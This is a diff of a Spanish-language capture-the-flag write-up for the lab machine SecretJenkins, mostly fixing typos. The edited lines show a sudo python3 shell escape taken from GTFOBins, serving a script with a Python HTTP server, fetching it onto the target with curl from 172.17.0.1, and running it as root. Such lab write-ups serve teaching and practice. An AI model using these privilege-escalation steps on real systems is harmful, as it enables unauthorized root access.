@@ -93,10 +93,12 @@ Si ejecutamos `sudo -l` podemos ver que podemos ejecutar sin proporcionar contra
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/784a5bb5-c6e0-4895-8a7e-abd7d12b0c20)
 <br>
 
-Por lo que deberíamos hacer ahora es dirigirnos a la página [GTFOBins](https://gtfobins.github.io/) (está página nos indica como elevar privilegios dependiendo del binario que podamos ejecutar), después nos vamos a la parte de sudo en python3, y nos encontramos con el siguiente comando `sudo python -c 'import os; os.system("/bin/sh")'`. Y lo ejecutaríamos de lwa siguiente forma `sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/bash")'`. <br>
+Por lo que deberíamos hacer ahora es dirigirnos a la página [GTFOBins](https://gtfobins.github.io/) (está página nos indica como elevar privilegios dependiendo del binario que podamos ejecutar), después nos vamos a la parte de sudo en python3, y nos encontramos con el siguiente comando `sudo python -c 'import os; os.system("/bin/sh")'`. Y lo ejecutaríamos de la siguiente forma `sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/bash")'`. <br>
 <br>
 
-Y ya seríamos el usuario **pinguinito**, ejecutamos otras vez el `sudo -l` y nos encontramos con lo siguiente: <br>
+Y ya seríamos el usuario **pinguinito**, ejecutamos otras vez el `sudo -l` y nos encontramos con lo siguiente: 
+<br>
+
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/cedce804-521c-4d03-b0e4-76d927b1c1fc)
 <br>
 
@@ -106,10 +108,9 @@ Por lo que nos dirigimos a la ubicación del archivo e intentamos modificarlo pa
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/5b7b63aa-43b6-49b4-ac98-acbc1d40dc20)
 <br>
 
-No montamos un servidor HTTP en python en la ubicación de nuestro archivo `script.py` de la siguiente forma `python3 -m http.server 80` para poder compartir dicho archivo con la máquina de **SecretJenkins**. <br>
+Nos montamos un servidor HTTP en python en la ubicación de nuestro archivo `script.py` de la siguiente forma `python3 -m http.server 80` para poder compartir dicho archivo con la máquina de **SecretJenkins**. <br>
 
 Ahora en la máquina **SecretJenkins** accedemos al archivo de la siguiente forma `curl http://172.17.0.1/script.py -O script.py`, antes deberíamos haber puesto permiso de escritura en el archivo `scirpt.py` con `chmod +w script.py`. Una vez tenemos dicho archivo hacemos `sudo -u root /usr/bin/python3 /opt/script.py` para ejecutar dicho archivo como root y listo ya somos root:  
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/d9f1e7ce-a131-4683-9fdb-fe976dcad531)
-<br>
